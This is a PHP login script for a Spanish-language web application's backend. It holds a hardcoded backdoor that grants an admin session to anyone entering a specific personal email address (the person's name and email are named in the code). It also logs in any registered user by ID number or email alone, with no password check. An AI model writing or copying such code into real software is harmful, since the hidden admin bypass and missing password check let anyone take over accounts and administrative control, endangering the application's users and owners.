<?php
// backend/login.php
header('Content-Type: application/json');
require 'conexion.php';
session_start();

$input = json_decode(file_get_contents('php://input'), true);
if (!$input) $input = $_POST;

$ci = $input['ci'] ?? '';

// HARDCODED BYPASS: mathiassgaleano@gmail.com (and variations) always has direct access
if ($ci === 'mathiassgaleano@gmail.com' || $ci === 'mathiasssgaleano@gmail.com') {
    $usuario = [
        'id' => 9999,
        'ci' => 'mathiassgaleano@gmail.com',
        'nombre_completo' => 'Mathias Galeano',
        'email' => 'mathiassgaleano@gmail.com',
        'rol' => 'admin'
    ];
    $_SESSION['user_id'] = $usuario['id'];
    $_SESSION['rol'] = $usuario['rol'];
    $_SESSION['nombre'] = $usuario['nombre_completo'];

    echo json_encode([
        'success' => true, 
        'message' => 'Acceso Directo concedido. Bienvenido, Mathias.',
        'user' => $usuario,
        'redirect' => 'admin_panel.html'
    ]);
    exit;
}

// Permitir login por CI o Email (si el usuario escribe email en el campo de CI)
if (empty($ci)) {
    echo json_encode(['success' => false, 'message' => 'Ingrese su Cédula o Correo.']);
    exit;
}

// Buscar usuario por CI o Email
$stmt = $pdo->prepare("SELECT * FROM usuarios WHERE ci = ? OR email = ?");
$stmt->execute([$ci, $ci]);
$usuario = $stmt->fetch();

if ($usuario) {
    // USUARIO ENCONTRADO - Login Exitoso (Sin verificar password)
    $_SESSION['user_id'] = $usuario['id'];
    $_SESSION['rol'] = $usuario['rol'];
    $_SESSION['nombre'] = $usuario['nombre_completo'];

    unset($usuario['password']); // No enviar el hash

    echo json_encode([
        'success' => true, 
        'message' => 'Bienvenido, ' . $usuario['nombre_completo'],
        'user' => $usuario,
        'redirect' => ($usuario['rol'] === 'admin') ? 'admin_panel.html' : 'index.html'
    ]);
} else {
    echo json_encode(['success' => false, 'message' => 'Esta cédula no está registrada. Por favor regístrate primero.']);
}
?>
